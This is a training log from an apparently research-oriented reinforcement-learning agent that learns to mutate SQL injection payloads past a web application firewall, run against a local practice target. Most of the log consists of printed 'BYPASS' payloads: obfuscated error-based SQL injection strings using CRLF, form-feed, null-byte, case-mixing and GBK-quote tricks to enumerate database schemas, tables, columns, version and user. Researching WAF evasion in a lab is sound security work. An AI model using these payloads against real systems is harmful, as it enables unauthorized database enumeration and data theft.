/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 1
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-45.01
  Ep 2550 | SR=0% | Steps=15.0 | R=-39.86
  Ep 2560 | SR=0% | Steps=15.0 | R=-38.68
  Ep 2570 | SR=0% | Steps=15.0 | R=-38.56
  Ep 2580 | SR=0% | Steps=15.0 | R=-37.73
  Ep 2590 | SR=0% | Steps=15.0 | R=-38.58
  Ep 2600 | SR=0% | Steps=15.0 | R=-39.88
  Ep 2610 | SR=0% | Steps=15.0 | R=-37.87
  [BYPASS] Ep 2617 | steps=8 | seq=case -> case -> null_byte -> case -> case -> case -> func_sp_nbsp -> crlf
           payload: 1'%0d%0aANd%0d%0aGTID_SUBSET((DaTABASE%a0()),1);%00
  Ep 2620 | SR=10% | Steps=14.3 | R=-34.84
  Ep 2630 | SR=0% | Steps=15.0 | R=-38.73
  Ep 2640 | SR=0% | Steps=15.0 | R=-37.15
  [BYPASS] Ep 2644 | steps=10 | seq=null_byte -> crlf -> case -> case -> case -> case -> nested_union -> case -> hex_to_char -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFrOm%0d%0a(SELeCT%0d%0a((seleCt%0d%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),taBlE_name))%0d%0afrOM%0d%0a
  Ep 2650 | SR=10% | Steps=14.5 | R=-34.24
  [BYPASS] Ep 2657 | steps=11 | seq=null_byte -> case -> case -> null_byte -> case -> func_sp_nbsp -> null_byte -> agg_swap -> case -> case -> formfeed
           payload: 1'%0cAnd%0cEXP(~(seleCt%0c*%0cfRoM%0c(SeLECT%0c((sElECt%0cJSON_ARRAYAGG(column_name)%0cfROM%0cInFOrmATioN_scHema.columns%0cwHeRe%0ctAblE_schema=DaTABA
  Ep 2660 | SR=10% | Steps=14.6 | R=-36.43
  [BYPASS] Ep 2669 | steps=8 | seq=case -> null_byte -> case -> dbl_url_comment -> case -> between_space -> hex_to_char -> func_sp_nbsp
           payload: 1'%a0ANd%a0GTID_SUBSET((version%a0()),1);%00
  Ep 2670 | SR=10% | Steps=14.3 | R=-36.05
  Ep 2680 | SR=0% | Steps=15.0 | R=-39.46
  Ep 2690 | SR=0% | Steps=15.0 | R=-38.73
  Ep 2700 | SR=0% | Steps=15.0 | R=-38.17
  [BYPASS] Ep 2706 | steps=8 | seq=crlf -> case -> agg_swap -> case -> crlf -> case -> case -> null_byte
           payload: 1'%0d%0aanD%0d%0aEXP(~(sELECt%0d%0a*%0d%0afrom%0d%0a(sELEct%0d%0a((SeLEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFroM%0d%0aInforMATion_sCHEmA.schemata))
  Ep 2710 | SR=10% | Steps=14.3 | R=-35.75
  [BYPASS] Ep 2720 | steps=15 | seq=case -> case -> case -> case -> case -> case -> formfeed -> case -> case -> null_byte -> case -> null_byte -> case -> null_byte -> agg_swap
           payload: 1'%0caNd%0cEXP(~(seLECt%0c*%0cFROm%0c(SelecT%0c((sELECT%0cJSON_ARRAYAGG(schema_name)%0cfROM%0ciNFormaTion_SChEmA.schemata)))a));%00
  Ep 2720 | SR=10% | Steps=15.0 | R=-37.59
  [BYPASS] Ep 2724 | steps=12 | seq=case -> crlf -> case -> hex_to_char -> null_byte -> case -> hash_nl -> case -> case -> case -> null_byte -> agg_swap
           payload: 1'%0d%0aanD%0d%0aEXP(~(SeLECT%0d%0a*%0d%0aFrOm%0d%0a(seleCt%0d%0a((SeLeCt%0d%0aJSON_ARRAYAGG(CONCAT(tAbLE_schema,CHAR(46),TaBLE_name))%0d%0afroM%0d%0a
  Ep 2730 | SR=10% | Steps=14.7 | R=-36.15
  Ep 2740 | SR=0% | Steps=15.0 | R=-37.51
  Ep 2750 | SR=0% | Steps=15.0 | R=-38.71
  [BYPASS] Ep 2759 | steps=15 | seq=case -> case -> agg_swap -> case -> null_byte -> case -> case -> null_byte -> case -> agg_swap -> case -> case -> case -> crlf -> func_sp_nbsp
           payload: 1'%0d%0aand%0d%0aEXP(~(seleCT%0d%0a*%0d%0aFRom%0d%0a(SelEcT%0d%0a(version%a0()))a));%00
  Ep 2760 | SR=10% | Steps=15.0 | R=-37.08
  Ep 2770 | SR=0% | Steps=15.0 | R=-39.29
  [BYPASS] Ep 2772 | steps=12 | seq=case -> gbk_bypass -> agg_swap -> crlf -> case -> func_sp_nbsp -> agg_swap -> hash_nl_all -> agg_swap -> case -> agg_swap -> null_byte
           payload: 1%bf%27%0d%0aaND%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afrom%0d%0a(SELEct%0d%0a(daTabase%a0()))a));%00
  Ep 2780 | SR=10% | Steps=14.7 | R=-38.52
  Ep 2790 | SR=0% | Steps=15.0 | R=-37.58
  [BYPASS] Ep 2798 | steps=7 | seq=case -> case -> null_byte -> case -> formfeed -> null_byte -> agg_swap
           payload: 1'%0caND%0cEXP(~(SELECt%0c*%0cFRoM%0c(SeLeCT%0c((sELECT%0cJSON_ARRAYAGG(schema_name)%0cfROM%0ciNfOrMaTion_schema.schemata)))a));%00
  Ep 2800 | SR=10% | Steps=14.2 | R=-34.86
  [BYPASS] Ep 2810 | steps=9 | seq=agg_swap -> formfeed -> case -> case -> null_byte -> crlf -> case -> case -> hex_to_char
           payload: 1'%0cand%0cEXP(~(SELeCT%0c*%0cfROM%0c(seleCt%0c((SElEct%0cJSON_ARRAYAGG(ConcAt(TabLE_schema,CHAR(46),tAbLE_name))%0cfROm%0cinFoRMAtIoN_SChEmA.TAbles%0
  Ep 2810 | SR=10% | Steps=14.4 | R=-34.60
  [BYPASS] Ep 2812 | steps=8 | seq=case -> agg_swap -> case -> agg_swap -> case -> crlf -> case -> null_byte
           payload: 1'%0d%0aAnD%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFRoM%0d%0a(SeLECT%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINfOrmatIoN_sCheMa.schemata))
  Ep 2820 | SR=10% | Steps=14.3 | R=-33.97
  Ep 2830 | SR=0% | Steps=15.0 | R=-39.63
  Ep 2840 | SR=0% | Steps=15.0 | R=-37.78
  Ep 2850 | SR=0% | Steps=15.0 | R=-37.72
  [BYPASS] Ep 2852 | steps=11 | seq=case -> case -> null_byte -> crlf -> case -> case -> case -> case -> case -> null_byte -> agg_swap
           payload: 1'%0d%0aANd%0d%0aEXP(~(SelEcT%0d%0a*%0d%0afrOm%0d%0a(seLeCt%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aINfoRMatiON_ScHEMa.schemata))
  [BYPASS] Ep 2856 | steps=9 | seq=case -> hex_to_char -> case -> crlf -> agg_swap -> agg_swap -> case -> case -> null_byte
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelECt%0d%0a*%0d%0afrOM%0d%0a(SELECt%0d%0a((SElECt%0d%0aJSON_ARRAYAGG(cONCAt(tAbLE_schema,CHAR(46),TABle_name))%0d%0afROM%0d%0a
  Ep 2860 | SR=20% | Steps=14.0 | R=-31.67
  [BYPASS] Ep 2868 | steps=5 | seq=case -> char_split -> agg_swap -> crlf -> null_byte
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFROm%0d%0a(SElect%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aInfOrMatION_schEmA.schemata))
  [BYPASS] Ep 2870 | steps=10 | seq=case -> crlf -> case -> agg_swap -> case -> case -> case -> case -> crlf -> null_byte
           payload: 1'%0d%0aanD%0d%0aEXP(~(selEct%0d%0a*%0d%0aFroM%0d%0a(SELEct%0d%0a((selecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRom%0d%0aInFoRMatIon_sChEma.schemata))
  Ep 2870 | SR=20% | Steps=13.5 | R=-31.99
  [BYPASS] Ep 2874 | steps=15 | seq=case -> crlf -> null_byte -> case -> case -> comment -> case -> case -> case -> case -> null_byte -> agg_swap -> backtick -> case -> func_sp_nbsp
           payload: 1'%0d%0aanD%0d%0aEXP(~(SELECt%0d%0a*%0d%0afROM%0d%0a(SELect%0d%0a((selECT%0d%0aJSON_ARRAYAGG(column_name)%0d%0afroM%0d%0aiNFormatION_scHEma.columns%0d
  Ep 2880 | SR=10% | Steps=15.0 | R=-37.02
  Ep 2890 | SR=0% | Steps=15.0 | R=-39.78
  Ep 2900 | SR=0% | Steps=15.0 | R=-37.82
  Ep 2910 | SR=0% | Steps=15.0 | R=-38.74
  [BYPASS] Ep 2915 | steps=9 | seq=crlf -> agg_swap -> case -> null_byte -> case -> null_byte -> agg_swap -> case -> hex_to_char
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sEleCT%0d%0a*%0d%0afrOm%0d%0a(sElECt%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(CONcAT(TaBLE_schema,CHAR(46),TABlE_name))%0d%0afrOM%0d%0a
  [BYPASS] Ep 2916 | steps=9 | seq=func_sp_ff -> hex_to_char -> case -> formfeed -> case -> case -> agg_swap -> case -> null_byte
           payload: 1'%0cANd%0cEXP(~(seLECT%0c*%0cFrOM%0c(SeLECT%0c((SElecT%0cJSON_ARRAYAGG(cOnCat(table_schema,CHAR(46),taBLe_name))%0cfROm%0cINfORmaTIoN_sChEMa.tAbLes%0
  [BYPASS] Ep 2919 | steps=6 | seq=case -> hex_to_char -> crlf -> case -> null_byte -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFrOM%0d%0a(seLECT%0d%0a((sELECt%0d%0aJSON_ARRAYAGG(CONCAT(tABLe_schema,CHAR(46),tablE_name))%0d%0afROM%0d%0a
  Ep 2920 | SR=30% | Steps=12.9 | R=-27.71
  [BYPASS] Ep 2921 | steps=7 | seq=agg_swap -> case -> func_sp_nbsp -> ident_backtick -> case -> formfeed -> null_byte
           payload: 1'%0cAnd%0cGTID_SUBSET((DAtaBaSE%a0()),1);%00
  Ep 2930 | SR=10% | Steps=14.2 | R=-33.92
  Ep 2940 | SR=0% | Steps=15.0 | R=-38.67
  Ep 2950 | SR=0% | Steps=15.0 | R=-36.91
  Ep 2960 | SR=0% | Steps=15.0 | R=-38.41
  Ep 2970 | SR=0% | Steps=15.0 | R=-37.59
  Ep 2980 | SR=0% | Steps=15.0 | R=-36.91
  Ep 2990 | SR=0% | Steps=15.0 | R=-38.30
  Ep 3000 | SR=0% | Steps=15.0 | R=-38.71
  [BYPASS] Ep 3001 | steps=5 | seq=agg_swap -> crlf -> case -> case -> null_byte
           payload: 1'%0d%0aANd%0d%0aEXP(~(SEleCt%0d%0a*%0d%0aFroM%0d%0a(selEct%0d%0a((SelECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aiNfOrMAtIOn_scHeMA.schemata))
  [BYPASS] Ep 3004 | steps=14 | seq=agg_swap -> case -> crlf -> case -> case -> case -> null_byte -> case -> case -> case -> case -> case -> hex_to_char -> func_sp_nbsp
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFRom%0d%0a(sELecT%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFroM%0d%0aiNFOrmATION_ScHEMa.columns%0d
  Ep 3010 | SR=20% | Steps=13.9 | R=-31.38
  Ep 3020 | SR=0% | Steps=15.0 | R=-36.51
  Ep 3030 | SR=0% | Steps=15.0 | R=-37.39
  Ep 3040 | SR=0% | Steps=15.0 | R=-38.20
  Ep 3050 | SR=0% | Steps=15.0 | R=-37.53
  Ep 3060 | SR=0% | Steps=15.0 | R=-37.65
  [BYPASS] Ep 3065 | steps=9 | seq=case -> hex_to_char -> case -> case -> crlf -> case -> null_byte -> case -> agg_swap
           payload: 1'%0d%0aAND%0d%0aEXP(~(selecT%0d%0a*%0d%0afROM%0d%0a(SeLEcT%0d%0a((SelecT%0d%0aJSON_ARRAYAGG(CONCAT(TABLE_schema,CHAR(46),tablE_name))%0d%0aFRom%0d%0a
  Ep 3070 | SR=10% | Steps=14.4 | R=-33.58
  [BYPASS] Ep 3071 | steps=15 | seq=case -> case -> case -> null_byte -> case -> case -> hex_to_char -> agg_swap -> case -> case -> case -> case -> crlf -> case -> func_sp_nbsp
           payload: 1'%0d%0aand%0d%0aEXP(~(seleCt%0d%0a*%0d%0aFRoM%0d%0a(sELeCt%0d%0a((SElEct%0d%0aConCAT(CHAR(124),JSON_ARRAYAGG(TABLe_name),CHAR(124))%0d%0aFRoM%0d%0aIN
  Ep 3080 | SR=10% | Steps=15.0 | R=-36.94
  Ep 3090 | SR=0% | Steps=15.0 | R=-35.91
  Ep 3100 | SR=0% | Steps=15.0 | R=-36.84
  Ep 3110 | SR=0% | Steps=15.0 | R=-36.54
  Ep 3120 | SR=0% | Steps=15.0 | R=-36.81
  Ep 3130 | SR=0% | Steps=15.0 | R=-37.55
  [BYPASS] Ep 3133 | steps=11 | seq=unhex_wrap -> case -> crlf -> case -> case -> case -> func_sp_nbsp -> case -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0d%0aANd%0d%0aEXP(~(sElEct%0d%0a*%0d%0aFRoM%0d%0a(sElecT%0d%0a(user%a0()))a));%00
  Ep 3140 | SR=10% | Steps=14.6 | R=-35.00
  [BYPASS] Ep 3148 | steps=8 | seq=dot_prefix -> case -> crlf -> case -> null_byte -> case -> case -> func_sp_nbsp
           payload: .11'%0d%0aanD%0d%0aEXP(~(seleCT%0d%0a*%0d%0afrOm%0d%0a(SeLEcT%0d%0a(DaTAbASE%a0()))a));%00
  Ep 3150 | SR=10% | Steps=14.3 | R=-34.51
  [BYPASS] Ep 3153 | steps=14 | seq=case -> case -> case -> case -> crlf -> case -> case -> case -> case -> null_byte -> case -> case -> case -> agg_swap
           payload: 1'%0d%0aAnd%0d%0aEXP(~(selecT%0d%0a*%0d%0afROM%0d%0a(sELEct%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0ainformatIon_sCHeMa.schemata))
  Ep 3160 | SR=10% | Steps=14.9 | R=-35.13
  Ep 3170 | SR=0% | Steps=15.0 | R=-35.23
  Ep 3180 | SR=0% | Steps=15.0 | R=-37.29
  [BYPASS] Ep 3183 | steps=7 | seq=null_byte -> case -> case -> agg_swap -> func_sp_nl -> case -> crlf
           payload: 1'%0d%0aANd%0d%0aEXP(~(selEcT%0d%0a*%0d%0afrOm%0d%0a(sEleCT%0d%0a((seLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afRoM%0d%0aiNfORMAtion_ScHEmA.schemata))
  [BYPASS] Ep 3190 | steps=8 | seq=case -> null_byte -> case -> hex_to_char -> func_sp_nl -> agg_swap -> case -> crlf
           payload: 1'%0d%0aAnd%0d%0aEXP(~(sELECT%0d%0a*%0d%0aFrOM%0d%0a(sEleCt%0d%0a((SelEcT%0d%0aJSON_ARRAYAGG(COncAT(TaBlE_schema,CHAR(46),taBLE_name))%0d%0afRoM%0d%0a
  Ep 3190 | SR=20% | Steps=13.5 | R=-30.56
  [BYPASS] Ep 3196 | steps=7 | seq=crlf -> case -> null_byte -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnD%0d%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 3197 | steps=6 | seq=case -> crlf -> convert_charset -> case -> null_byte -> func_sp_nbsp
           payload: 1'%0d%0aANd%0d%0aGTID_SUBSET((daTAbASE%a0()),1);%00
  Ep 3200 | SR=20% | Steps=13.3 | R=-29.17
  Ep 3210 | SR=0% | Steps=15.0 | R=-36.88
  Ep 3220 | SR=0% | Steps=15.0 | R=-37.41
  Ep 3230 | SR=0% | Steps=15.0 | R=-36.60
  Ep 3240 | SR=0% | Steps=15.0 | R=-36.41
  Ep 3250 | SR=0% | Steps=15.0 | R=-36.55
  Ep 3260 | SR=0% | Steps=15.0 | R=-36.82
  [BYPASS] Ep 3265 | steps=11 | seq=agg_swap -> case -> case -> case -> func_sp_nl -> case -> crlf -> case -> case -> case -> null_byte
           payload: 1'%0d%0aAND%0d%0aEXP(~(seLECT%0d%0a*%0d%0afROM%0d%0a(seLect%0d%0a((sELECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aInFORmaTION_SCHEMa.schemata))
  Ep 3270 | SR=10% | Steps=14.6 | R=-35.65
  [BYPASS] Ep 3277 | steps=7 | seq=case -> null_byte -> case -> crlf -> hex_to_char -> null_byte -> agg_swap
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElECT%0d%0a*%0d%0aFRoM%0d%0a(SElecT%0d%0a((selECT%0d%0aJSON_ARRAYAGG(CONCAT(tAble_schema,CHAR(46),TaBlE_name))%0d%0aFRom%0d%0a
  Ep 3280 | SR=10% | Steps=14.2 | R=-34.36
  [BYPASS] Ep 3289 | steps=4 | seq=agg_swap -> null_byte -> case -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(selEcT%0d%0a*%0d%0aFRoM%0d%0a(SElEct%0d%0a((SeLECT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0aInForMATiON_sCheMA.schemata))
  Ep 3290 | SR=10% | Steps=13.9 | R=-31.48
  Ep 3300 | SR=0% | Steps=15.0 | R=-37.68
  [BYPASS] Ep 3306 | steps=7 | seq=agg_swap -> case -> crlf -> case -> case -> case -> null_byte
           payload: 1'%0d%0aaND%0d%0aEXP(~(SeLect%0d%0a*%0d%0aFrOM%0d%0a(SeLEct%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0ainfOrMatiOn_schEma.schemata))
  Ep 3310 | SR=10% | Steps=14.2 | R=-33.60
  Ep 3320 | SR=0% | Steps=15.0 | R=-36.26
  Ep 3330 | SR=0% | Steps=15.0 | R=-37.25
  Ep 3340 | SR=0% | Steps=15.0 | R=-33.93
  [BYPASS] Ep 3346 | steps=7 | seq=case -> hex_to_char -> null_byte -> agg_swap -> case -> case -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(sElect%0d%0a*%0d%0aFroM%0d%0a(SeleCt%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(ConCat(TaBLE_schema,CHAR(46),TaBle_name))%0d%0aFroM%0d%0a
  Ep 3350 | SR=10% | Steps=14.2 | R=-32.50
  Ep 3360 | SR=0% | Steps=15.0 | R=-35.77
  Ep 3370 | SR=0% | Steps=15.0 | R=-37.69
  Ep 3380 | SR=0% | Steps=15.0 | R=-36.30
  Ep 3390 | SR=0% | Steps=15.0 | R=-36.67
  [BYPASS] Ep 3394 | steps=15 | seq=case -> case -> case -> case -> case -> case -> null_byte -> case -> case -> func_sp_nl -> case -> case -> agg_swap -> case -> crlf
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sElEcT%0d%0a*%0d%0afROM%0d%0a(sELeCT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aInfOrMATion_scHemA.schemata))
  Ep 3400 | SR=10% | Steps=15.0 | R=-35.52
  Ep 3410 | SR=0% | Steps=15.0 | R=-35.76
  [BYPASS] Ep 3413 | steps=14 | seq=case -> hex_to_char -> case -> case -> case -> agg_swap -> case -> agg_swap -> case -> case -> formfeed -> case -> case -> null_byte
           payload: 1'%0cand%0cEXP(~(sElect%0c*%0cFROm%0c(sELeCT%0c((sElECT%0cJSON_ARRAYAGG(ConCaT(TaBle_schema,CHAR(46),TABlE_name))%0cfRom%0ciNfOrMaTIOn_sCheMA.tAbles%0
  Ep 3420 | SR=10% | Steps=14.9 | R=-33.75
  Ep 3430 | SR=0% | Steps=15.0 | R=-36.54
  Ep 3440 | SR=0% | Steps=15.0 | R=-36.50
  [BYPASS] Ep 3442 | steps=9 | seq=case -> null_byte -> null_byte -> case -> null_byte -> case -> crlf -> case -> agg_swap
           payload: 1'%0d%0aaND%0d%0aEXP(~(seleCt%0d%0a*%0d%0afrOm%0d%0a(seLect%0d%0a((seLECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aiNFOrmAtIOn_Schema.schemata))
  Ep 3450 | SR=10% | Steps=14.4 | R=-33.28
  Ep 3460 | SR=0% | Steps=15.0 | R=-38.29
  Ep 3470 | SR=0% | Steps=15.0 | R=-36.43
  Ep 3480 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3490 | SR=0% | Steps=15.0 | R=-35.86
  Ep 3500 | SR=0% | Steps=15.0 | R=-36.79
  Ep 3510 | SR=0% | Steps=15.0 | R=-36.44
  Ep 3520 | SR=0% | Steps=15.0 | R=-35.42
  Ep 3530 | SR=0% | Steps=15.0 | R=-37.41
  Ep 3540 | SR=0% | Steps=15.0 | R=-37.08
  Ep 3550 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3560 | SR=0% | Steps=15.0 | R=-37.23
  Ep 3570 | SR=0% | Steps=15.0 | R=-36.81
  Ep 3580 | SR=0% | Steps=15.0 | R=-37.40
  Ep 3590 | SR=0% | Steps=15.0 | R=-36.03
  [BYPASS] Ep 3593 | steps=15 | seq=case -> crlf -> case -> case -> case -> case -> case -> gbk_bypass -> case -> case -> case -> case -> null_byte -> case -> agg_swap
           payload: 1%bf%27%0d%0aAnD%0d%0aEXP(~(SeLECt%0d%0a*%0d%0afROM%0d%0a(SELEct%0d%0a((SeLect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOM%0d%0aINfoRMAtion_SChEmA.schem
  [BYPASS] Ep 3598 | steps=8 | seq=case -> hex_to_char -> case -> case -> null_byte -> agg_swap -> case -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(SElEcT%0d%0a*%0d%0aFRom%0d%0a(seLect%0d%0a((SeLECt%0d%0aJSON_ARRAYAGG(ConcAt(tABLe_schema,CHAR(46),TabLe_name))%0d%0afROM%0d%0a
  Ep 3600 | SR=20% | Steps=14.3 | R=-31.87
  [BYPASS] Ep 3609 | steps=12 | seq=case -> crlf -> case -> null_byte -> case -> null_byte -> case -> hex_to_char -> func_swap_err -> case -> case -> agg_swap
           payload: 1'%0d%0aANd%0d%0aEXP(~(SelECT%0d%0a*%0d%0afroM%0d%0a(sEleCt%0d%0a((seLeCT%0d%0aJSON_ARRAYAGG(CONCAT(table_schema,CHAR(46),TabLe_name))%0d%0afRoM%0d%0a
  Ep 3610 | SR=10% | Steps=14.7 | R=-33.58
  Ep 3620 | SR=0% | Steps=15.0 | R=-37.58
  [BYPASS] Ep 3621 | steps=14 | seq=case -> crlf -> case -> hex_to_char -> case -> crlf -> case -> case -> case -> case -> agg_swap -> case -> case -> null_byte
           payload: 1'%0d%0aaND%0d%0aEXP(~(SElect%0d%0a*%0d%0afROm%0d%0a(SElEct%0d%0a((sELect%0d%0aJSON_ARRAYAGG(cOnCAt(TAblE_schema,CHAR(46),tabLE_name))%0d%0aFroM%0d%0a
  [BYPASS] Ep 3624 | steps=5 | seq=case -> crlf -> agg_swap -> case -> null_byte
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElect%0d%0a*%0d%0aFROM%0d%0a(sELECt%0d%0a((sELect%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOM%0d%0ainFORmAtION_SChEmA.schemata))
  Ep 3630 | SR=20% | Steps=13.9 | R=-31.55
  [BYPASS] Ep 3638 | steps=6 | seq=agg_swap -> case -> null_byte -> agg_swap -> case -> crlf
           payload: 1'%0d%0aAND%0d%0aEXP(~(selECt%0d%0a*%0d%0afROm%0d%0a(sElEct%0d%0a((SELecT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFRom%0d%0aiNForMaTIOn_schEmA.schemata))
  Ep 3640 | SR=10% | Steps=14.1 | R=-34.92
  Ep 3650 | SR=0% | Steps=15.0 | R=-38.30
  Ep 3660 | SR=0% | Steps=15.0 | R=-36.59
  Ep 3670 | SR=0% | Steps=15.0 | R=-37.30
  Ep 3680 | SR=0% | Steps=15.0 | R=-37.06
  Ep 3690 | SR=0% | Steps=15.0 | R=-35.73
  [BYPASS] Ep 3693 | steps=7 | seq=case -> crlf -> hex_to_char -> case -> case -> null_byte -> agg_swap
           payload: 1'%0d%0aand%0d%0aEXP(~(SeLeCT%0d%0a*%0d%0afrOM%0d%0a(SELect%0d%0a((SEleCt%0d%0aJSON_ARRAYAGG(CONCAT(TAbLE_schema,CHAR(46),taBLE_name))%0d%0aFroM%0d%0a
  Ep 3700 | SR=10% | Steps=14.2 | R=-31.62
  Ep 3710 | SR=0% | Steps=15.0 | R=-36.27
  Ep 3720 | SR=0% | Steps=15.0 | R=-36.96
  Ep 3730 | SR=0% | Steps=15.0 | R=-38.28
  Ep 3740 | SR=0% | Steps=15.0 | R=-37.83
  [BYPASS] Ep 3745 | steps=6 | seq=agg_swap -> case -> func_sp_ff -> null_byte -> case -> crlf
           payload: 1'%0d%0aaNd%0d%0aEXP(~(selecT%0d%0a*%0d%0aFROm%0d%0a(SeleCT%0d%0a((seLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afROm%0d%0aINforMAtiON_scHema.schemata))
  [BYPASS] Ep 3750 | steps=14 | seq=case -> case -> crlf -> case -> case -> case -> case -> case -> case -> case -> agg_swap -> case -> case -> null_byte
           payload: 1'%0d%0aaNd%0d%0aEXP(~(seLECT%0d%0a*%0d%0aFRom%0d%0a(selEct%0d%0a((SeLEct%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFrOm%0d%0aiNfoRmaTion_SchEMA.schemata))
  Ep 3750 | SR=20% | Steps=14.0 | R=-31.15
  Ep 3760 | SR=0% | Steps=15.0 | R=-37.86
  Ep 3770 | SR=0% | Steps=15.0 | R=-37.38
  Ep 3780 | SR=0% | Steps=15.0 | R=-37.42
  Ep 3790 | SR=0% | Steps=15.0 | R=-36.39
  Ep 3800 | SR=0% | Steps=15.0 | R=-37.48
  Ep 3810 | SR=0% | Steps=15.0 | R=-37.07
  Ep 3820 | SR=0% | Steps=15.0 | R=-36.89
  Ep 3830 | SR=0% | Steps=15.0 | R=-36.56
  Ep 3840 | SR=0% | Steps=15.0 | R=-35.88
  Ep 3850 | SR=0% | Steps=15.0 | R=-36.52
  [BYPASS] Ep 3855 | steps=6 | seq=agg_swap -> case -> crlf -> case -> case -> null_byte
           payload: 1'%0d%0aAnd%0d%0aEXP(~(SelecT%0d%0a*%0d%0afROM%0d%0a(seLEcT%0d%0a((sElEcT%0d%0aJSON_ARRAYAGG(schema_name)%0d%0afrOm%0d%0aInFoRmATIoN_sChEmA.schemata))
  Ep 3860 | SR=10% | Steps=14.1 | R=-32.28
  Ep 3870 | SR=0% | Steps=15.0 | R=-37.28
  Ep 3880 | SR=0% | Steps=15.0 | R=-36.66
  Ep 3890 | SR=0% | Steps=15.0 | R=-36.68
  Ep 3900 | SR=0% | Steps=15.0 | R=-36.79
  Ep 3910 | SR=0% | Steps=15.0 | R=-36.89
  Ep 3920 | SR=0% | Steps=15.0 | R=-37.14
